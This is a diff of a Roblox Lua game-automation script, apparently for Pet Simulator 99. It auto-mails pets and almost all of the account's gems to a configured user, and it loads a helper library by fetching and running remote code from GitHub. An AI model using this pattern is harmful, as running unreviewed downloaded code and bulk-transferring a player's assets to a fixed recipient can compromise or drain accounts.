@@ -5,7 +5,7 @@ print("Auto Mail loaded!!")
 getgenv().config = {
 	userToMail = "TrnBi99",
 	minShards = 50,
-	gemAmount = 2000000,
+	gemAmount = 300000,
 }
 
 local TrungBLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/TrungB2/PS99/main/TrungBLib.lua')))()
@@ -67,6 +67,7 @@ function autoMail()
 		}
 		game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
 		print("Send Huge Poseidon Corgi to "..config.userToMail.."!")
+
 	    end
 	end
 
@@ -83,10 +84,10 @@ function autoMail()
 				[2] = v.id,
 				[3] = "Currency",
 				[4] = i,
-				[5] = config.gemAmount - 10000
+				[5] = v._am - 60000
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			print("Send "..config.gemAmount.." Gems to "..config.userToMail.."!")
+			print("Send "..v._am.." Gems to "..config.userToMail.."!")
 		end
 	    end
 	    task.wait(0.05)
